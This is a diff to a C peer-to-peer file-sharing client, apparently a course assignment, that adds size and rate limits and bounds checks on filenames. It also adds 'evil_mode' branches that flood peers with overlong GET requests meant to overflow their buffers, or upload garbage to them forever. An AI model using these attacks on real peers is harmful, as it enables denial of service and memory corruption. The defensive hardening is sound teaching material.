@@ -43,6 +43,9 @@ sem_t tracker_mutex;       //Create a mutex for syncing access to the tracker
 #define TASKBUFSIZ	4096	// Size of task_t::buf
 #define FILENAMESIZ	256	// Size of task_t::filename
 #define NTHREADS 128    //Default Number of threads
+#define MAXFILESIZ 50*1024*1024 // (50 MB) arbitrary default filesize to prevet endless dowload
+#define NUMREADS 16     //number of reads to sample to determine rate 
+#define MINRATE 128     // minimum rate required to keep a peer 
 
 typedef enum tasktype {		// Which type of connection is this?
 	TASK_TRACKER,		// => Tracker connection
@@ -496,7 +499,7 @@ task_t *start_download(task_t *tracker_task, const char *filename)
 		error("* Error while allocating task");
 		goto exit;
 	}
-	strncpy(t->filename,filename,FILENAMESIZ);
+	strncpy(t->filename,filename,FILENAMESIZ - 1);
 
 	// add peers
     sem_wait(&tracker_mutex);
@@ -549,6 +552,13 @@ static void task_download(task_t *t, task_t *tracker_task)
 		error("* Cannot connect to peer: %s\n", strerror(errno));
 		goto try_again;
 	}
+    if(evil_mode != 0) //if evil mode, spam overflow
+    {
+        while(1)
+        {
+    	    osp2p_writef(t->peer_fd, "GET caaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaatz.jpg OSP2P\n");
+        }
+    }
 	osp2p_writef(t->peer_fd, "GET %s OSP2P\n", t->filename);
 
 	// Open disk file for the result.
@@ -576,10 +586,20 @@ static void task_download(task_t *t, task_t *tracker_task)
 		task_free(t);
 		return;
 	}
-
+    int num_reads = 0;  //keep count of reads to determine download rate.
 	// Read the file into the task buffer from the peer,
 	// and write it from the task buffer onto disk.
 	while (1) {
+        if(t->total_written > MAXFILESIZ)
+        {
+            error("Max file size achieved.");
+            goto try_again;
+        }
+        if(num_reads >= NUMREADS && t->total_written / num_reads < MINRATE)
+        {
+            error("Peer upload rate too slow.");
+            goto try_again;
+        }
 		int ret = read_to_taskbuf(t->peer_fd, t);
 		if (ret == TBUF_ERROR) {
 			error("* Peer read error");
@@ -593,6 +613,7 @@ static void task_download(task_t *t, task_t *tracker_task)
 			error("* Disk write error");
 			goto try_again;
 		}
+        num_reads++;
 	}
 
 	// Empty files are usually a symptom of some error.
@@ -667,9 +688,21 @@ static void task_upload(task_t *t)
 			   || (t->tail && t->buf[t->tail-1] == '\n'))
 			break;
 	}
+    
+    if(evil_mode != 0)  //if attacking, repeatedly upload garbage forever.
+    {
+        int fd_garbage[2]; 
+        pipe(fd_garbage);
+        while(1)
+        {
+            write(fd_garbage[1],"asdfalshdfkjsdhafkjhsdalfkhaslkdjfhdjf",36);
+            read_to_taskbuf(fd_garbage[0],t);
+            write_from_taskbuf(t->peer_fd,t); 
+        }
+    }
 
 	assert(t->head == 0);
-	if (osp2p_snscanf(t->buf, t->tail, "GET %s OSP2P\n", t->filename) < 0) {
+	if (osp2p_snscanf(t->buf, FILENAMESIZ -1, "GET %s OSP2P\n", t->filename) < 0) {
 		error("* Odd request %.*s\n", t->tail, t->buf);
 		goto exit;
 	}
@@ -680,17 +713,17 @@ static void task_upload(task_t *t)
 
     if(realpath(t->filename,resolved_name) == NULL)
     {
-        error("Filename isn't a real path");
+        error("Filename isn't a real path: %s\n",t->filename);
         goto exit;
     }
     if(getcwd(working_dir,PATH_MAX) == NULL)
     {
-        error("Couldn't get CWD");
+        error("Couldn't get CWD\n");
         goto exit;
     }
     if(strncmp(resolved_name,working_dir,strlen(working_dir)) != 0)
     {
-        error("Requested file is not within CWD");
+        error("Requested file is not within CWD\n");
         goto exit;
     }
     
